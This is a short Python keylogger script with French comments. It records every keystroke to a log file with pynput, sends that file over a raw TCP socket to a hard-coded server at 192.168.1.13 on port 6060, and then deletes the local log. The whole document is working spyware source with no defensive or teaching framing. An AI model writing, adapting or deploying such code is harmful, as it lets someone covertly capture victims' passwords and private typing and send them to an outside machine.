import socket
import os
import time
import threading
from pynput.keyboard import Key, Listener
import logging
  
fin = False

def on_press(key):
    logging.info(str(key))
 
def keylogger(): 
    with Listener(on_press=on_press) as listener :
        listener.join()

def send_file(filename, server_address, server_port):
    with open(filename, 'rb') as file:
        file_data = file.read()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_address, server_port))
        s.sendall(file_data)

def main():
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    filename = "keylog.txt" 
    server_address = "192.168.1.13"  # Adresse IP du serveur
    server_port = 6060  # Port du serveur
    keylogger()
    #time.sleep(2)
    send_file(filename, server_address, server_port)

    # Attendre l'ordre du serveur
    
    os.remove(filename)

if __name__ == "__main__":
    main()
